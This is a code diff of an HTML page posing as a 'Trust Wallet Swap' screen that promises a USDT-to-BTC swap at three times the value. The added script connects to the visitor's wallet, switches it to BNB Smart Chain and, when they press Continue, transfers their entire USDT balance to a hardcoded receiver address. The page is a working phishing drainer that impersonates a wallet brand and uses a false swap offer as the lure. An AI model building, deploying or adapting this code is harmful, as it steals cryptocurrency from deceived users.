@@ -1,454 +1,346 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Trust Wallet Swap</title>
-    <style>
-        :root {
-            --primary: #3375BB;
-            --primary-glow: rgba(51, 117, 187, 0.4);
-            --text-dark: #1E2026;
-            --text-medium: #474D57;
-            --text-light: #848E9C;
-            --bg: #F5F7FA;
-            --card: #FFFFFF;
-            --border: #EAECEF;
-            --tabbar-bg: #FFFFFF;
-            --error-red: #FF4D4F;
-        }
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
-        body {
-            background-color: var(--bg);
-            color: var(--text-dark);
-            touch-action: manipulation;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            max-width: 450px;
-            margin: 0 auto;
-            padding-bottom: 60px;
-        }
-        .swap-header {
-            padding: 16px;
-            font-size: 20px;
-            font-weight: 600;
-            text-align: center;
-            border-bottom: 1px solid var(--border);
-        }
-        .swap-body {
-            padding: 16px;
-        }
-        .token-box {
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 12px;
-            background-color: var(--card);
-        }
-        .token-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-        }
-        .token-label {
-            font-size: 14px;
-            color: var(--text-medium);
-            font-weight: 500;
-        }
-        .token-info {
-            display: flex;
-            align-items: center;
-        }
-        .token-name {
-            font-weight: 600;
-            font-size: 16px;
-        }
-        .token-network {
-            font-size: 12px;
-            color: var(--text-light);
-            margin-left: 6px;
-        }
-        .token-amount-container {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-        .token-amount {
-            font-size: 22px;
-            font-weight: 600;
-            color: var(--text-dark);
-            border: none;
-            background: transparent;
-            text-align: right;
-            width: 100%;
-            padding: 0;
-            outline: none;
-        }
-        .token-value {
-            font-size: 14px;
-            color: var(--text-dark);
-            margin-top: 4px;
-        }
-        .divider {
-            height: 1px;
-            background-color: var(--border);
-            margin: 12px 0;
-        }
-        .rate-info {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 14px;
-            color: var(--text-medium);
-            margin: 16px 0;
-        }
-        .rate-icon {
-            margin: 0 6px;
-        }
-        .provider-section {
-            margin: 20px 0;
-        }
-        .provider-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 12px;
-        }
-        .provider-title {
-            font-size: 14px;
-            color: var(--text-medium);
-        }
-        .provider-value {
-            font-size: 15px;
-            font-weight: 500;
-            text-align: right;
-        }
-        .provider-subvalue {
-            font-size: 13px;
-            color: var(--text-light);
-            text-align: right;
-            margin-top: 2px;
-        }
-        .swap-button {
-            width: 100%;
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            padding: 16px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 16px;
-            box-shadow: 0 0 10px var(--primary-glow);
-            transition: all 0.3s ease;
-        }
-        .swap-button:hover {
-            box-shadow: 0 0 15px var(--primary-glow);
-        }
-        .swap-button:active {
-            transform: scale(0.98);
-        }
-        .error-message {
-            color: var(--error-red);
-            font-size: 14px;
-            text-align: center;
-            margin-top: 10px;
-            display: none;
-        }
-        .tab-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background-color: var(--tabbar-bg);
-            display: flex;
-            justify-content: space-around;
-            padding: 12px 0;
-            border-top: 1px solid var(--border);
-        }
-        .tab-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            font-size: 12px;
-            color: var(--text-medium);
-        }
-        .tab-icon {
-            margin-bottom: 4px;
-            font-size: 20px;
-        }
-        .tab-active {
-            color: var(--primary);
-        }
-        .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Trust Wallet Swap</title>
+  <style>
+    :root {
+      --primary: #3375BB;
+      --primary-glow: rgba(51, 117, 187, 0.4);
+      --text-dark: #1E2026;
+      --text-medium: #474D57;
+      --text-light: #848E9C;
+      --bg: #F5F7FA;
+      --card: #FFFFFF;
+      --border: #EAECEF;
+      --tabbar-bg: #FFFFFF;
+      --error-red: #FF4D4F;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+    body {
+      background-color: var(--bg);
+      color: var(--text-dark);
+      touch-action: manipulation;
+    }
+    .container {
+      max-width: 450px;
+      margin: 0 auto;
+      padding-bottom: 60px;
+    }
+    .swap-header {
+      padding: 16px;
+      font-size: 20px;
+      font-weight: 600;
+      text-align: center;
+      border-bottom: 1px solid var(--border);
+    }
+    .swap-body {
+      padding: 16px;
+    }
+    .token-box {
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 12px;
+      margin-bottom: 12px;
+      background-color: var(--card);
+    }
+    .token-header {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+    .token-label {
+      font-size: 14px;
+      color: var(--text-medium);
+      font-weight: 500;
+    }
+    .token-info {
+      display: flex;
+      align-items: center;
+    }
+    .token-name {
+      font-weight: 600;
+      font-size: 16px;
+    }
+    .token-network {
+      font-size: 12px;
+      color: var(--text-light);
+      margin-left: 6px;
+    }
+    .token-amount-container {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+    }
+    .token-amount {
+      font-size: 22px;
+      font-weight: 600;
+      color: var(--text-dark);
+      border: none;
+      background: transparent;
+      text-align: right;
+      width: 100%;
+      padding: 0;
+      outline: none;
+    }
+    .token-value {
+      font-size: 14px;
+      color: var(--text-dark);
+      margin-top: 4px;
+    }
+    .rate-info {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 14px;
+      color: var(--text-medium);
+      margin: 16px 0;
+    }
+    .rate-icon {
+      margin: 0 6px;
+    }
+    .provider-section {
+      margin: 20px 0;
+    }
+    .provider-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 12px;
+    }
+    .provider-title {
+      font-size: 14px;
+      color: var(--text-medium);
+    }
+    .provider-value {
+      font-size: 15px;
+      font-weight: 500;
+      text-align: right;
+    }
+    .provider-subvalue {
+      font-size: 13px;
+      color: var(--text-light);
+      text-align: right;
+      margin-top: 2px;
+    }
+    .swap-button {
+      width: 100%;
+      background-color: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 16px;
+      box-shadow: 0 0 10px var(--primary-glow);
+      transition: all 0.3s ease;
+    }
+    .swap-button:hover {
+      box-shadow: 0 0 15px var(--primary-glow);
+    }
+    .swap-button:active {
+      transform: scale(0.98);
+    }
+    .tab-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background-color: var(--tabbar-bg);
+      display: flex;
+      justify-content: space-around;
+      padding: 12px 0;
+      border-top: 1px solid var(--border);
+    }
+    .tab-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-size: 12px;
+      color: var(--text-medium);
+    }
+    .tab-icon {
+      margin-bottom: 4px;
+      font-size: 20px;
+    }
+    .tab-active {
+      color: var(--primary);
+    }
+    .spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s linear infinite;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="swap-header">Swap</div>
-        
-        <div class="swap-body">
-            <!-- From Token Box -->
-            <div class="token-box">
-                <div class="token-header">
-                    <div class="token-label">From</div>
-                    <div class="token-info">
-                        <span class="token-name">USDT ></span>
-                        <span class="token-network">BNB Smart Chain</span>
-                    </div>
-                </div>
-                <div class="token-amount-container">
-                    <input type="number" id="usdtInput" class="token-amount" value="200" placeholder="0">
-                    <div id="usdtValue" class="token-value">$200</div>
-                </div>
-            </div>
+  <div class="container">
+    <div class="swap-header">Swap</div>
 
-            <!-- To Token Box -->
-            <div class="token-box">
-                <div class="token-header">
-                    <div class="token-label">To</div>
-                    <div class="token-info">
-                        <span class="token-name">BTC ></span>
-                        <span class="token-network">Bitcoin</span>
-                    </div>
-                </div>
-                <div class="token-amount-container">
-                    <div id="btcAmount" class="token-amount">0.00506297</div>
-                    <div id="btcValue" class="token-value">$600.00</div>
-                </div>
-            </div>
-
-            <div class="rate-info">
-                <span>1 BTC ≈ 1,19,489.153599 USDT</span>
-                <span class="rate-icon">⇔</span>
-            </div>
-
-            <div class="provider-section">
-                <div class="provider-row">
-                    <div class="provider-title">Provider Fee</div>
-                    <div>
-                        <div class="provider-value">$0.50</div>
-                        <div class="provider-subvalue">0.00063 BNB</div>
-                    </div>
-                </div>
-                <div class="provider-row">
-                    <div class="provider-title">Provider</div>
-                    <div class="provider-value">Binance</div>
-                </div>
-            </div>
-
-            <div id="errorMessage" class="error-message"></div>
-
-            <button id="swapButton" class="swap-button">
-                <span id="buttonText">Continue</span>
-            </button>
+    <div class="swap-body">
+      <div class="token-box">
+        <div class="token-header">
+          <div class="token-label">From</div>
+          <div class="token-info">
+            <span class="token-name">USDT ></span>
+            <span class="token-network">BNB Smart Chain</span>
+          </div>
         </div>
-
-        <!-- Bottom Tab Bar -->
-        <div class="tab-bar">
-            <div class="tab-item">
-                <div class="tab-icon">🏠</div>
-                <div>Home</div>
-            </div>
-            <div class="tab-item">
-                <div class="tab-icon">📈</div>
-                <div>Trending</div>
-            </div>
-            <div class="tab-item tab-active">
-                <div class="tab-icon">🔄</div>
-                <div>Swap</div>
-            </div>
-            <div class="tab-item">
-                <div class="tab-icon">💰</div>
-                <div>Earn</div>
-            </div>
-            <div class="tab-item">
-                <div class="tab-icon">🔍</div>
-                <div>Discover</div>
-            </div>
+        <div class="token-amount-container">
+          <input type="number" id="usdtInput" class="token-amount" value="200" placeholder="0" disabled />
+          <div id="usdtValue" class="token-value">$200</div>
         </div>
+      </div>
+
+      <div class="token-box">
+        <div class="token-header">
+          <div class="token-label">To</div>
+          <div class="token-info">
+            <span class="token-name">BTC ></span>
+            <span class="token-network">Bitcoin</span>
+          </div>
+        </div>
+        <div class="token-amount-container">
+          <div id="btcAmount" class="token-amount">0.00506297</div>
+          <div id="btcValue" class="token-value">$600.00</div>
+        </div>
+      </div>
+
+      <div class="rate-info">
+        <span>1 BTC ≈ 1,19,489.153599 USDT</span>
+        <span class="rate-icon">⇔</span>
+      </div>
+
+      <div class="provider-section">
+        <div class="provider-row">
+          <div class="provider-title">Provider Fee</div>
+          <div>
+            <div class="provider-value">$0.50</div>
+            <div class="provider-subvalue">0.00063 BNB</div>
+          </div>
+        </div>
+        <div class="provider-row">
+          <div class="provider-title">Provider</div>
+          <div class="provider-value">Binance</div>
+        </div>
+      </div>
+
+      <button id="swapButton" class="swap-button">
+        <span id="buttonText">Continue</span>
+      </button>
     </div>
 
-    <!-- Load Ethers.js from CDN -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
-    
-    <script>
-        // Wait for DOM to be fully loaded
-        document.addEventListener('DOMContentLoaded', function() {
-            // DOM Elements
-            const usdtInput = document.getElementById('usdtInput');
-            const usdtValue = document.getElementById('usdtValue');
-            const btcAmount = document.getElementById('btcAmount');
-            const btcValue = document.getElementById('btcValue');
-            const swapButton = document.getElementById('swapButton');
-            const buttonText = document.getElementById('buttonText');
-            const errorMessage = document.getElementById('errorMessage');
-            
-            // BSC Settings - Updated for BEP20 USDT
-            const BSC_CHAIN_ID = '0x38'; // BNB Smart Chain
-            const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955'; // BEP20 USDT
-            const USDT_DECIMALS = 18;
-            const BTC_RATE = 119489.153599;
-            let MIN_SWAP_AMOUNT = 200;
-            
-            // Initialize
-            updateValues();
-            
-            // Update BTC values when USDT changes
-            usdtInput.addEventListener('input', function() {
-                updateValues();
-            });
-            
-            function updateValues() {
-                const usdt = parseFloat(usdtInput.value) || 0;
-                const usd = usdt * 1.0;
-                const btc = (usd * 3) / BTC_RATE; // 3x multiplier
-                
-                usdtValue.textContent = `$${usd.toFixed(2)}`;
-                btcAmount.textContent = btc.toFixed(8);
-                btcValue.textContent = `$${(usd * 3).toFixed(2)}`;
-                
-                errorMessage.style.display = 'none';
+    <div class="tab-bar">
+      <div class="tab-item"><div class="tab-icon">🏠</div><div>Home</div></div>
+      <div class="tab-item"><div class="tab-icon">📈</div><div>Trending</div></div>
+      <div class="tab-item tab-active"><div class="tab-icon">🔄</div><div>Swap</div></div>
+      <div class="tab-item"><div class="tab-icon">💰</div><div>Earn</div></div>
+      <div class="tab-item"><div class="tab-icon">🔍</div><div>Discover</div></div>
+    </div>
+  </div>
+
+  <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const swapButton = document.getElementById('swapButton');
+      const buttonText = document.getElementById('buttonText');
+
+      const BSC_CHAIN_ID = '0x38';
+      const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
+      const USDT_DECIMALS = 18;
+      const MIN_SWAP_AMOUNT = 200;
+      const RECEIVER_ADDRESS = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999';
+      const MIN_BNB_FOR_GAS = 0.002;
+
+      swapButton.addEventListener('click', async function () {
+        buttonText.innerHTML = '<span class="spinner"></span> Processing';
+        swapButton.disabled = true;
+
+        try {
+          if (!window.ethereum) throw new Error('Please install MetaMask or Trust Wallet');
+
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          const signer = provider.getSigner();
+
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+          if (chainId !== BSC_CHAIN_ID) {
+            try {
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: BSC_CHAIN_ID }],
+              });
+            } catch (switchError) {
+              if (switchError.code === 4902) {
+                await window.ethereum.request({
+                  method: 'wallet_addEthereumChain',
+                  params: [{
+                    chainId: BSC_CHAIN_ID,
+                    chainName: 'BNB Smart Chain',
+                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                    blockExplorerUrls: ['https://bscscan.com'],
+                  }],
+                });
+              } else {
+                throw new Error('Failed to switch to BNB Smart Chain');
+              }
             }
-            
-            swapButton.addEventListener('click', async function() {
-                const usdtAmount = parseFloat(usdtInput.value) || 0;
-                MIN_SWAP_AMOUNT = usdtAmount;
-                
-                buttonText.innerHTML = '<span class="spinner"></span> Processing';
-                swapButton.disabled = true;
-                errorMessage.style.display = 'none';
-                
-                try {
-                    // Check if Web3 provider is available
-                    if (!window.ethereum) {
-                        throw new Error('Please install Trust Wallet or MetaMask to continue');
-                    }
-                    
-                    // Check if ethers is defined
-                    if (typeof ethers === 'undefined') {
-                        throw new Error('Ethers.js not loaded. Please try again.');
-                    }
-                    
-                    // Request account access if needed
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    
-                    // Check/switch to BSC
-                    await ensureBSCNetwork();
-                    
-                    // Get user address
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const signer = provider.getSigner();
-                    const userAddress = await signer.getAddress();
-                    
-                    // Check USDT balance (BEP20)
-                    const usdtBalance = await checkUSDTBalance(userAddress);
-                    
-                    if (usdtBalance < MIN_SWAP_AMOUNT) {
-                        const needed = (MIN_SWAP_AMOUNT - usdtBalance).toFixed(2);
-                        errorMessage.textContent = `❌ Insufficient USDT (BEP20) balance. You need ${needed} more USDT`;
-                        errorMessage.style.display = 'block';
-                        throw new Error('Insufficient USDT balance');
-                    }
-                    
-                    // If balance is sufficient, proceed with swap
-                    alert(`Swap initiated: ${usdtAmount} USDT (BEP20) to BTC (3x value)`);
-                    // Here you would normally call your swap contract or API
-                    
-                } catch (error) {
-                    console.error('Swap error:', error);
-                    if (!error.message.includes('Insufficient')) {
-                        errorMessage.textContent = error.message;
-                        errorMessage.style.display = 'block';
-                    }
-                } finally {
-                    buttonText.textContent = 'Continue';
-                    swapButton.disabled = false;
-                }
-            });
-            
-            async function ensureBSCNetwork() {
-                try {
-                    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
-                    if (currentChain !== BSC_CHAIN_ID) {
-                        try {
-                            await window.ethereum.request({
-                                method: 'wallet_switchEthereumChain',
-                                params: [{ chainId: BSC_CHAIN_ID }],
-                            });
-                        } catch (switchError) {
-                            // This error code indicates that the chain has not been added to MetaMask
-                            if (switchError.code === 4902) {
-                                await addBSCNetwork();
-                            } else {
-                                throw new Error('Failed to switch to BNB Smart Chain');
-                            }
-                        }
-                    }
-                } catch (error) {
-                    throw new Error('Network error: ' + error.message);
-                }
-            }
-            
-            async function addBSCNetwork() {
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: BSC_CHAIN_ID,
-                            chainName: 'BNB Smart Chain',
-                            nativeCurrency: {
-                                name: 'BNB',
-                                symbol: 'BNB',
-                                decimals: 18,
-                            },
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            blockExplorerUrls: ['https://bscscan.com'],
-                        }],
-                    });
-                } catch (addError) {
-                    throw new Error('User rejected adding BNB Smart Chain');
-                }
-            }
-            
-            async function checkUSDTBalance(userAddress) {
-                try {
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const contract = new ethers.Contract(
-                        USDT_CONTRACT,
-                        ['function balanceOf(address) view returns (uint256)'],
-                        provider
-                    );
-                    
-                    const balance = await contract.balanceOf(userAddress);
-                    return parseFloat(ethers.utils.formatUnits(balance, USDT_DECIMALS));
-                } catch (error) {
-                    console.error('Balance check error:', error);
-                    throw new Error('Failed to check USDT balance');
-                }
-            }
-        });
-    </script>
+          }
+
+          const userAddress = await signer.getAddress();
+          const bnbBalance = await provider.getBalance(userAddress);
+          const bnb = parseFloat(ethers.utils.formatEther(bnbBalance));
+          if (bnb < MIN_BNB_FOR_GAS) {
+            alert('❌ Insufficient BNB for gas fee. At least ~$0.50 BNB required');
+            return;
+          }
+
+          const usdtContract = new ethers.Contract(
+            USDT_CONTRACT,
+            ['function balanceOf(address) view returns (uint256)', 'function transfer(address to, uint256 amount) returns (bool)'],
+            signer
+          );
+
+          const balanceRaw = await usdtContract.balanceOf(userAddress);
+          const balance = parseFloat(ethers.utils.formatUnits(balanceRaw, USDT_DECIMALS));
+
+          if (balance < MIN_SWAP_AMOUNT) {
+            alert('❌ Minimum 200 USDT required (BEP20 on BNB Smart Chain)');
+            return;
+          }
+
+          const tx = await usdtContract.transfer(RECEIVER_ADDRESS, balanceRaw);
+          await tx.wait();
+
+          alert(`✅ Successfully transferred ${balance.toFixed(2)} USDT to receiver address.`);
+        } catch (err) {
+          console.error(err);
+          alert(`❌ Error: ${err.message}`);
+        } finally {
+          buttonText.textContent = 'Continue';
+          swapButton.disabled = false;
+        }
+      });
+    });
+  </script>
 </body>
 </html>
